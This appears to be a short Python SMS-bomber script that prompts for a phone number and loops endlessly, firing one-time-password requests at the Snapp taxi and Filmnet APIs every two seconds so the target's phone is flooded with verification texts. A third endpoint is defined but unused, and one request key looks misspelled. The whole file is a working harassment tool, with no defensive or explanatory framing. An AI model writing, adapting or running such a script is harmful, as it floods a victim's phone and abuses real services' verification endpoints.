import requests
from termcolor import colored
import time

url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
phonen = input('phone number: ')
url1 = f'https://filmnet.ir/api-v2/access-token/users/{phonen}/otp'
url2 = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'

pnd = {'cellphon': f'{phonen}'}

while True:
      time.sleep(2)
      req = requests.post(url, json=pnd)
      req1 = requests.get(url1)
      req2 = requests.post(url, json=pnd)
      
      print(colored('yes', 'red'))
